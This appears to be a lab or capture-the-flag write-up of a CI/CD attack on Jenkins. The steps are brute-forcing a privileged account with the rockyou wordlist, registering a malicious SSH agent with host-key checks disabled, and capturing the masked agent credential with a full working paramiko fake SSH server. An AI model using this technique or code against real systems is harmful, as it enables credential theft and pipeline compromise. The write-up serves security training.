# Hearts - Attack

**Technique:** CICD-SEC-7, Insecure System Configuration. A weak password
on a privileged Jenkins account, combined with a permissive agent-launch
feature, lets an attacker redirect Jenkins' own outbound credential use
toward a server they control.

## Step 1: Identify the Privileged Account

Jenkins' People list showed a `knave` account whose profile description
read **"Agents admin"**, distinguishing it from the standard `alice`
account used everywhere else in this project.

## Step 2: Brute-Force the Account's Password

Wrote a Python script using the `requests` library to submit repeated
login attempts against Jenkins' `/j_spring_security_check` endpoint,
username fixed to `knave`, password drawn one line at a time from
`rockyou.txt` (a well-known real-world leaked-password wordlist, ~14.3
million entries). Distinguished a failed login from a successful one by
inspecting the response's `Location` header: a failed attempt redirects
to a URL containing `loginError`; a successful one does not.

The correct password was found well before exhausting the wordlist.

## Step 3: Register a Malicious SSH Agent

Logged into Jenkins as `knave` (not `alice`) and created a new node under
**Manage Jenkins → Nodes → New Node**, type **Permanent Agent**:

- **Launch method:** Launch agents via SSH
- **Host:** `host.docker.internal` (the Docker Desktop-specific hostname
  that resolves back to the host machine from inside a container; the
  standard `docker0` bridge-gateway approach assumed by most public
  write-ups does not apply the same way under Docker Desktop for Windows)
- **Port:** 9091 (arbitrary, matched to the listener below)
- **Credentials:** selected an existing entry, displayed only as
  `agent/*****`, its actual value masked and never visible through the
  UI regardless of permission level
- **Host Key Verification Strategy:** Non verifying Verification Strategy
  (necessary since the fake server below presents a throwaway key with no
  prior trust relationship)

## Step 4: Capture the Credential in Transit

Since Jenkins would attempt to genuinely authenticate to the configured
host using the real credential value, standing up a fake SSH server to
receive that connection attempt captures the value without ever needing
to see it in the UI.

Generated a throwaway host key:

```bash
ssh-keygen -t ed25519 -f ssh.key -N ""
```

Wrote a minimal SSH server using `paramiko`, accepting any connection,
logging the submitted username and password, then deliberately rejecting
the authentication attempt (so Jenkins doesn't hang waiting on a real
agent shell that will never come):

```python
import paramiko
import socket

class Server(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        print(f"Username: {username}")
        print(f"Password: {password}")
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", 9091))
sock.listen(5)
print("Listening on 0.0.0.0:9091...")

while True:
    client, addr = sock.accept()
    print(f"Connection from {addr}")
    transport = paramiko.Transport(client)
    opts = transport.get_security_options()
    opts.kex = ("ecdh-sha2-nistp256",)
    transport.add_server_key(paramiko.Ed25519Key(filename="ssh.key"))
    server = Server()
    transport.start_server(server=server)
    try:
        transport.accept(20)
    except Exception as e:
        print(f"Transport error: {e}")
```

## A Real Debugging Detour: Key Exchange Mismatch

The first connection attempt from Jenkins failed the SSH handshake before
authentication was even reached:

```
Exception (server): Expecting packet from (30,), got 34
```

This occurs during key exchange, before any password is sent, and was not
resolved by upgrading `paramiko` to its latest version (5.0.0), ruling out
a simple outdated-library bug. The likely cause: Jenkins' SSH client
implementation and paramiko's server-side code negotiating a key-exchange
algorithm that paramiko's server mode does not fully support end to end.
Explicitly restricting the negotiated key-exchange algorithm to a single,
well-supported one (`opts.kex = ("ecdh-sha2-nistp256",)`, added
immediately after creating the `Transport` object) resolved it on the
next connection attempt.

## Result

Saving the node configuration (or re-triggering "Launch agent") caused
Jenkins to connect to the honeypot and submit real authentication
credentials:

```
Connection from ('127.0.0.1', <port>)
Username: agent
Password: [REDACTED - see 03-flag.md]
```
